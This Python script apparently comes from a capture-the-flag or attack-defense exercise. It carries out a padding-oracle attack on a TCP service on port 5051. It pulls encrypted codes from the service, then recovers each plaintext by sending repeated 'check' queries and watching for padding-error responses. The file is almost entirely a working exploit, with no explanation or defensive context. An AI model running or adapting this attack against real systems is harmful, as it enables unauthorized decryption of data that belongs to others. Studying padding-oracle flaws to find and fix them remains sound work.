# -*- coding: utf-8 -*-
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode, encode
import socket
import time
import logging
import sys

ADDRESS = 5051

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.address = (kwargs["address"], ADDRESS)

    def oracle(self, data, **kwargs):
        while 1:
            try:

                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(self.address)
                self.sock.sendall("check {0}".format(data))
                res = self.sock.recv(1000).strip(b"\x00").decode("utf-8")
                break
            except (socket.error):
                time.sleep(1)
                continue
        self.history.append(res)
        if res != "error":
            self.sock.close()
            return
        self.sock.close()
        raise BadPaddingException

def get_codes(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, ADDRESS))
    sock.sendall("show 0 10".encode())
    res = sock.recv(1000).strip(b"\x00")
    sock.close()
    return(res.split(b"separator"))


if __name__ == '__main__':
    address = sys.argv[1]
    logging.basicConfig(level=logging.DEBUG)
    encoded = get_codes(sys.argv[1])
    print(encoded)
    padbuster = PadBuster(address=address)
    for code in encoded:
        start = time.time()
        result = padbuster.decrypt(code, block_size=16)
        print("=====================")
        print(result)
        print("=====================")
        print(time.time() - start)
